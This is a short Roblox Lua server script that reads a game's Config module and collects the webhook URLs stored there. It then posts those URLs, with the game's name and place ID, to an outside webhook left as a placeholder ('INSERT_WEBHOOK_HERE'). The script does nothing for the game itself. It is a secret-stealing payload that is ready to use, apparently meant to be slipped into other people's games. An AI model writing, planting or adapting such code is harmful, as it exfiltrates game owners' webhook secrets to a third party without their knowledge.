local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local MarketplaceService = game:GetService("MarketplaceService")

local webhooker = "INSERT_WEBHOOK_HERE"

local config
local success, err = pcall(function()
	config = require(game.ServerScriptService.GameData.Config)
end)

if not success or not config then
	warn("Failed to require config:", err)
	return
end

local placeId = game.PlaceId
local gameName = "Unknown Game Name"

local infoSuccess, infoResult = pcall(function()
	return MarketplaceService:GetProductInfo(placeId)
end)

if infoSuccess and infoResult then
	gameName = infoResult.Name
else
	warn("Failed to fetch game name:", infoResult)
end

local webhookKeys = {
	"REGULAR_WEBHOOK_URL",
	"SC_WEBHOOK_URL",
	"ALL_JUMP_MODE_URL",
	"KICK_WEBHOOK_URL"
}

local fields = {}

for _, key in ipairs(webhookKeys) do
	local url = config[key]
	table.insert(fields, {
		name = key,
		value = (url and url ~= "") and ("`" .. url .. "`") or "*Not set*",
		inline = false
	})
end

local payload = {
	embeds = {{
		title = gameName,
		description = string.format("Place ID: `%d`", placeId),
		color = 0xFF0000,
		fields = fields,
		timestamp = DateTime.now():ToIsoDate()
	}}
}

local successPost, errPost = pcall(function()
	HttpService:PostAsync(webhooker, HttpService:JSONEncode(payload), Enum.HttpContentType.ApplicationJson)
end)

if not successPost then
	warn("Failed to post to webhook:", errPost)
end
